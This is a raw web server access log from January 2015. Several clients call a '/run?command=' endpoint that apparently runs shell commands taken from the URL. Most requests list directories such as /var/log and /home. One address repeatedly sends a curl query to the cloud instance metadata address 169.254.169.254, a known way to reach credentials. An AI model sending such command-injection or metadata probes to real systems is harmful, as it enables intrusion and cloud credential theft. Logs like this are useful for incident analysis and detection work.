213.74.127.134 - - [19/Jan/2015:13:24:30 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/|tr%20%27\x5Cn%27%20%27%3C/br%3E%27 HTTP/1.1" 200 186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
38.119.133.34 - - [19/Jan/2015:13:24:32 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257"
94.39.200.45 - - [19/Jan/2015:13:24:37 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
94.39.200.45 - - [19/Jan/2015:13:24:37 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:24:42 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/|tr%20%27\x5Cn%27%20%27dss%27 HTTP/1.1" 200 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
188.207.241.66 - - [19/Jan/2015:13:24:44 +0000] "GET /run?command=ls%20/var/log/ HTTP/1.1" 200 161 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
188.207.241.66 - - [19/Jan/2015:13:24:48 +0000] "GET /run?command=ls%20-l%20/var/log/ HTTP/1.1" 200 464 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
62.39.9.251 - - [19/Jan/2015:13:24:51 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
62.39.9.251 - - [19/Jan/2015:13:24:52 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
62.39.9.251 - - [19/Jan/2015:13:24:52 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
213.74.127.134 - - [19/Jan/2015:13:24:58 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/|tr%20%27\x5Cn%27%20%22%3Cbr%3E%22 HTTP/1.1" 200 186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
188.207.241.66 - - [19/Jan/2015:13:25:09 +0000] "GET /run?command=ls%20/home HTTP/1.1" 200 14 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
174.3.155.246 - - [19/Jan/2015:13:25:09 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36"
174.3.155.246 - - [19/Jan/2015:13:25:10 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36"
212.140.253.1 - - [19/Jan/2015:13:25:11 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36"
212.140.253.1 - - [19/Jan/2015:13:25:11 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36"
188.207.241.66 - - [19/Jan/2015:13:25:16 +0000] "GET /run?command=ls%20/home/python HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
